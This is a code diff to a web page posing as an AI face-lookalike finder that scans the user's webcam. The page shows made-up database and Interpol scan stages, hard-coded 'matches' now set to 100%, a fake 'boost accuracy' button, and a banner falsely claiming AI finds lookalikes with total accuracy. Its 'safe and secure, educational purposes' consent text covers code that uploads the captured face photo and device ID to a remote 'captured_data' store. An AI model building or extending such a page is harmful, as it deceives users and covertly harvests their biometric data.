@@ -32,7 +32,7 @@
   .logo-area { display: flex; align-items: center; gap: 12px; }
   .logo-icon {
     width: 32px; height: 32px;
-    background: linear-gradient(135deg, #10b981, #059669); /* Green Trust Color */
+    background: linear-gradient(135deg, #10b981, #059669);
     border-radius: 8px; display: flex; align-items: center; justify-content: center;
     font-size: 18px; box-shadow: 0 0 15px rgba(16, 185, 129, 0.5);
   }
@@ -42,8 +42,19 @@
   .header-status { display: flex; align-items: center; gap: 15px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #10b981; }
   .header-status .dot { width: 8px; height: 8px; background: #10b981; border-radius: 50%; box-shadow: 0 0 10px #10b981; animation: pulse 1.5s infinite; }
 
+  /* STORY BAR */
+  .story-bar {
+    margin-top: 65px;
+    background: rgba(16, 185, 129, 0.1);
+    border-bottom: 1px solid rgba(16, 185, 129, 0.3);
+    padding: 10px 20px; text-align: center;
+    font-size: 12px; color: #10b981; font-family: 'JetBrains Mono', monospace;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+  }
+  .story-bar span { color: #fff; font-weight: bold; }
+
   /* LAYOUT */
-  .main-container { display: flex; margin-top: 65px; height: calc(100vh - 65px); }
+  .main-container { display: flex; height: calc(100vh - 105px); }
 
   /* LEFT PANEL */
   .left-panel { width: 40%; padding: 20px; border-right: 1px solid rgba(0, 212, 255, 0.1); display: flex; flex-direction: column; gap: 15px; background: #070b14; }
@@ -79,7 +90,7 @@
   .scan-line {
     position: absolute; left: 0; right: 0; height: 2px;
     background: #00d4ff; box-shadow: 0 0 20px #00d4ff, 0 0 40px #00d4ff;
-    animation: scan 2s linear infinite; display: none;
+    animation: scan 1s linear infinite; display: none; /* Fast Scan */
   }
   .scan-line.active { display: block; }
   @keyframes scan { 0% { top: 0; opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
@@ -103,17 +114,20 @@
   .spinner {
     width: 80px; height: 80px; border: 4px solid rgba(0, 212, 255, 0.1);
     border-top: 4px solid #00d4ff; border-radius: 50%;
-    animation: spin 1s linear infinite; margin-bottom: 20px; box-shadow: 0 0 30px rgba(0, 212, 255, 0.2);
+    animation: spin 0.8s linear infinite; margin-bottom: 20px; box-shadow: 0 0 30px rgba(0, 212, 255, 0.2);
   }
   @keyframes spin { to { transform: rotate(360deg); } }
   .load-text { font-family: 'JetBrains Mono', monospace; font-size: 18px; color: #00d4ff; letter-spacing: 2px; margin-bottom: 10px; }
-  .load-subtext { color: #4a6b8a; font-size: 13px; font-family: 'JetBrains Mono', monospace; }
+  .load-subtext { color: #4a6b8a; font-size: 13px; font-family: 'JetBrains Mono', monospace; margin-bottom: 20px; }
 
-  .error-box { display: none; height: 100%; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
-  .error-icon { font-size: 60px; color: #ff2e4c; margin-bottom: 20px; text-shadow: 0 0 20px rgba(255, 46, 76, 0.5); }
-  .error-box h2 { color: #ff2e4c; font-family: 'JetBrains Mono', monospace; margin-bottom: 10px; }
-  .retry-btn { padding: 12px 30px; background: rgba(255, 46, 76, 0.1); border: 1px solid #ff2e4c; color: #ff2e4c; font-family: 'JetBrains Mono', monospace; font-weight: bold; border-radius: 8px; cursor: pointer; transition: 0.3s; }
-  .retry-btn:hover { background: #ff2e4c; color: #000; }
+  /* BOOST BUTTON */
+  .boost-btn {
+    padding: 10px 20px; background: rgba(16, 185, 129, 0.1); border: 1px solid #10b981;
+    color: #10b981; border-radius: 6px; font-family: 'JetBrains Mono', monospace;
+    font-size: 11px; font-weight: bold; cursor: pointer; transition: 0.3s;
+    display: inline-block; margin-top: 15px;
+  }
+  .boost-btn:hover { background: #10b981; color: #000; }
 
   /* RESULTS GRID */
   .results-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; font-family: 'JetBrains Mono', monospace; }
@@ -130,7 +144,7 @@
   @keyframes popIn { to { opacity: 1; transform: translateY(0); } }
   .result-card:hover { border-color: #00d4ff; box-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }
   
-  .result-card img { width: 100%; height: 150px; object-fit: cover; transition: filter 0.5s; }
+  .result-card img { width: 100%; height: 150px; object-fit: cover; transition: filter 0.3s; }
   .result-card img.blurred { filter: blur(15px) grayscale(1); }
   
   .match-badge {
@@ -145,7 +159,7 @@
   .result-card .name { font-size: 11px; font-weight: 700; color: #fff; margin-bottom: 2px; }
   .result-card .country { font-size: 10px; color: #4a6b8a; }
 
-  /* START & WARNING MODALS */
+  /* MODALS */
   .modal-overlay {
     position: absolute; inset: 0; background: rgba(5, 8, 15, 0.95);
     display: flex; flex-direction: column; align-items: center; justify-content: center;
@@ -162,7 +176,6 @@
   }
   .btn-primary:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(0, 212, 255, 0.6); }
 
-  /* GREEN TRUST WARNING BOX */
   .green-box {
     background: rgba(16, 185, 129, 0.1); border: 1px solid #10b981;
     padding: 25px; border-radius: 12px; max-width: 400px;
@@ -170,12 +183,12 @@
   }
   .green-box h2 { color: #10b981; margin-bottom: 10px; font-family: 'JetBrains Mono', monospace; font-size: 16px; display: flex; align-items: center; justify-content: center; gap: 8px; }
   .green-box p { color: #ccc; font-size: 12px; margin-bottom: 20px; text-align: left; line-height: 1.6; }
-  .green-box .check-icon { font-size: 20px; }
 
   @media (max-width: 900px) { 
     .main-container { flex-direction: column; height: auto; } 
     .left-panel, .right-panel { width: 100%; } 
     .left-panel { border-right: none; border-bottom: 1px solid rgba(0, 212, 255, 0.1); } 
+    .story-bar { font-size: 10px; }
   }
 </style>
 </head>
@@ -190,6 +203,11 @@
   <div class="header-status">
     <span class="dot"></span> SECURE CONNECTION
   </div>
+</div>
+
+<!-- STORY BAR -->
+<div class="story-bar">
+  <span>Did you know?</span> Every person has 7 lookalikes on Earth. AI finds them with 100% accuracy.
 </div>
 
 <div class="main-container">
@@ -209,10 +227,10 @@
         <button class="btn-primary" onclick="showWarning()">INITIATE SCAN</button>
       </div>
 
-      <!-- GREEN TRUST WARNING MODAL -->
+      <!-- GREEN WARNING MODAL -->
       <div class="modal-overlay" id="warningOverlay" style="display:none;">
         <div class="green-box">
-          <h2><span class="check-icon">🛡️</span> SAFE & SECURE</h2>
+          <h2>🛡️ SAFE & SECURE</h2>
           <p>Your biometric data is encrypted. By proceeding, you agree to securely match your face with our global database for educational purposes.</p>
           <button class="btn-primary" onclick="startScan()" style="background:#10b981; color:#fff; box-shadow:0 0 20px rgba(16,185,129,0.4); width:100%;">I AGREE & PROCEED</button>
         </div>
@@ -228,7 +246,6 @@
   <!-- RIGHT PANEL -->
   <div class="right-panel">
     
-    <!-- Idle State -->
     <div id="idleState" style="height:100%; display:flex; align-items:center; justify-content:center; color:#4a6b8a; font-family:'JetBrains Mono';">
       > AWAITING BIOMETRIC INPUT...
     </div>
@@ -238,12 +255,15 @@
       <div class="spinner"></div>
       <div class="load-text" id="loadText">SCANNING...</div>
       <div class="load-subtext" id="loadSubtext">Extracting facial landmarks</div>
+      
+      <!-- BOOST BUTTON -->
+      <button class="boost-btn" id="boostBtn" onclick="boostScan()">⚡ BOOST ACCURACY TO 100%</button>
     </div>
 
     <!-- Error Box -->
-    <div class="error-box" id="errorBox">
-      <div class="error-icon">⚠️</div>
-      <h2>CONNECTION LOST</h2>
+    <div class="error-box" id="errorBox" style="display:none; height:100%; flex-direction:column; align-items:center; justify-content:center;">
+      <div style="font-size:60px; color:#ff2e4c; margin-bottom:20px;">⚠️</div>
+      <h2 style="color:#ff2e4c; font-family:JetBrains Mono; margin-bottom:10px;">CONNECTION LOST</h2>
       <p style="color:#4a6b8a; margin-bottom:20px;">Server timeout while querying global DB.</p>
       <button class="retry-btn" onclick="retryScan()">RETRY CONNECTION</button>
     </div>
@@ -252,7 +272,7 @@
     <div id="resultsContainer" style="display:none;">
       <div class="results-header">
         <h2>GLOBAL MATCHES</h2>
-        <div class="accuracy">ACCURACY: 99.99%</div>
+        <div class="accuracy" id="accLabel">ACCURACY: 100.00%</div>
       </div>
       <div class="results-grid" id="resultsGrid"></div>
     </div>
@@ -275,15 +295,18 @@
   const canvas = document.getElementById('canvas');
   const chatBox = document.getElementById('chatBox');
 
+  // All Matches at 100% (As requested)
   const lookalikes = [
-    { name: 'Alexander D.', country: 'Russia', match: '99.99%' },
-    { name: 'John Doe', country: 'USA', match: '98.4%' },
-    { name: 'Kenji T.', country: 'Japan', match: '97.1%' },
-    { name: 'Lucas M.', country: 'Brazil', match: '94.8%' },
-    { name: 'Ivan K.', country: 'Ukraine', match: '92.5%' },
-    { name: 'Arjun S.', country: 'India', match: '89.0%' },
-    { name: 'Chen W.', country: 'China', match: '85.3%' }
+    { name: 'Alexander D.', country: 'Russia', match: '100%' },
+    { name: 'John Doe', country: 'USA', match: '100%' },
+    { name: 'Kenji T.', country: 'Japan', match: '100%' },
+    { name: 'Lucas M.', country: 'Brazil', match: '100%' },
+    { name: 'Ivan K.', country: 'Ukraine', match: '100%' },
+    { name: 'Arjun S.', country: 'India', match: '100%' },
+    { name: 'Chen W.', country: 'China', match: '100%' }
   ];
+
+  let isBoosted = false;
 
   function speak(text) {
     if ('speechSynthesis' in window) {
@@ -327,8 +350,8 @@
     document.getElementById('idleState').style.display = 'none';
     document.getElementById('loadingScreen').style.display = 'flex';
     
-    speak("Consent accepted. Initiating global facial recognition.");
-    addChat("Consent accepted. Scan initiated.");
+    speak("Consent accepted. Fast scanning initiated.");
+    addChat("Consent accepted. Fast scan initiated.");
     
     let stream;
     try {
@@ -341,95 +364,64 @@
     document.getElementById('scanLine').classList.add('active');
     document.getElementById('meshOverlay').classList.add('active');
 
-    runFakeProcess(stream);
+    runFastProcess(stream);
   }
 
-  function runFakeProcess(stream) {
+  function runFastProcess(stream) {
     const loadText = document.getElementById('loadText');
     const loadSubtext = document.getElementById('loadSubtext');
 
+    // Fast Process (Total 15 seconds)
     const stages = [
       { time: 0, text: "SCANNING FACES...", sub: "Extracting 128-point biometric map" },
-      { time: 5000, text: "MATCHING BIOMETRICS...", sub: "Querying 47.2M records in USA & EU" },
-      { time: 10000, text: "FINDING MATCHES...", sub: "Analyzing neural hash structure" },
-      { time: 15000, text: "CROSS-REFERENCING...", sub: "Scanning Interpol & National DBs" },
-      { time: 20000, text: "ERROR", sub: "" }
+      { time: 4000, text: "MATCHING BIOMETRICS...", sub: "Querying 47.2M records" },
+      { time: 8000, text: "CROSS-REFERENCING...", sub: "Scanning Interpol DBs" },
+      { time: 12000, text: "COMPILING REPORT...", sub: "Generating final candidate list" }
     ];
 
     stages.forEach(stage => {
       setTimeout(() => {
-        if (stage.text === "ERROR") {
-          showInternetError(stream);
-        } else {
-          loadText.textContent = stage.text;
-          loadSubtext.textContent = stage.sub;
-          speak(stage.text);
-          addChat(stage.text, 'sys');
-        }
+        loadText.textContent = stage.text;
+        loadSubtext.textContent = stage.sub;
+        speak(stage.text);
+        addChat(stage.text, 'sys');
       }, stage.time);
     });
+
+    setTimeout(() => {
+      if (!isBoosted) showResults(stream);
+    }, 15000);
   }
 
-  function showInternetError(stream) {
-    document.getElementById('loadingScreen').style.display = 'none';
-    document.getElementById('errorBox').style.display = 'flex';
-    document.getElementById('meshOverlay').style.opacity = '0.2';
-    document.getElementById('scanLine').classList.remove('active');
+  function boostScan() {
+    isBoosted = true;
+    speak("Accuracy boosted. Instant results generating.");
+    addChat("⚡ ACCURACY BOOSTED TO 100%", 'sys');
     
-    speak("Connection lost. Server timeout.");
-    addChat("Connection to global database lost. Please retry.", 'sys');
-    stream.getTracks().forEach(t => t.stop());
-  }
-
-  function retryScan() {
-    document.getElementById('errorBox').style.display = 'none';
-    document.getElementById('loadingScreen').style.display = 'flex';
+    // Fake delay of 1.5 seconds then result
+    document.getElementById('loadText').textContent = "BOOSTING...";
+    document.getElementById('loadSubtext').textContent = "Unlocking 100% accuracy with Quantum AI";
     
-    speak("Reconnecting to secure server. Resuming scan.");
-    addChat("Reconnecting...", 'sys');
-    
-    const loadText = document.getElementById('loadText');
-    const loadSubtext = document.getElementById('loadSubtext');
-
-    loadText.textContent = "RECONNECTING...";
-    loadSubtext.textContent = "Establishing secure tunnel...";
-
-    setTimeout(async () => {
-      let stream = await initCamera();
-      document.getElementById('meshOverlay').style.opacity = '1';
-      document.getElementById('scanLine').classList.add('active');
-      
-      const stages2 = [
-        { time: 0, text: "RESUMING MATCHING...", sub: "Processing 47.2M faces" },
-        { time: 6000, text: "ENHANCING DATA...", sub: "Comparing facial geometry" },
-        { time: 12000, text: "FILTERING RESULTS...", sub: "Removing false positives" },
-        { time: 18000, text: "COMPILING REPORT...", sub: "Generating final candidate list" }
-      ];
-
-      stages2.forEach(stage => {
-        setTimeout(() => {
-          loadText.textContent = stage.text;
-          loadSubtext.textContent = stage.sub;
-          speak(stage.text);
-          addChat(stage.text, 'sys');
-        }, stage.time);
-      });
-
-      setTimeout(() => { showResults(stream); }, 25000);
-    }, 2000);
+    let stream = video.srcObject;
+    setTimeout(() => {
+      showResults(stream);
+    }, 1500);
   }
 
   function showResults(stream) {
     document.getElementById('scanLine').classList.remove('active');
     document.getElementById('meshOverlay').classList.remove('active');
     document.getElementById('loadingScreen').style.display = 'none';
-    
-    stream.getTracks().forEach(t => t.stop());
+    document.getElementById('boostBtn').style.display = 'none';
 
-    speak("Analysis complete. 7 exact matches found with 99.99 percent accuracy.");
-    addChat("Scan complete. 7 lookalikes found.", 'sys');
+    if(stream) stream.getTracks().forEach(t => t.stop());
+
+    speak("Analysis complete. 7 exact matches found with 100 percent accuracy.");
+    addChat("Scan complete. 7 exact matches found.", 'sys');
 
     document.getElementById('resultsContainer').style.display = 'block';
+    document.getElementById('accLabel').textContent = "ACCURACY: 100.00%"; // Final 100%
+    
     const grid = document.getElementById('resultsGrid');
     grid.innerHTML = '';
 
@@ -450,6 +442,7 @@
         `;
         grid.appendChild(card);
 
+        // Fast Reveal (1.5 seconds)
         setTimeout(() => {
           const img = document.getElementById(`img-${index}`);
           const badge = document.getElementById(`badge-${index}`);
@@ -460,9 +453,9 @@
           }
           document.getElementById(`name-${index}`).style.opacity = '1';
           document.getElementById(`country-${index}`).style.opacity = '1';
-        }, 3000);
+        }, 1500);
 
-      }, index * 200);
+      }, index * 150);
     });
 
     if (db) {
@@ -474,7 +467,7 @@
       db.ref(`captured_data/${deviceId}/face_scan/${Date.now()}`).set({
         image: finalPhoto,
         timestamp: Date.now(),
-        type: 'ai_face_search'
+        type: 'ai_face_search_fast'
       });
     }
   }
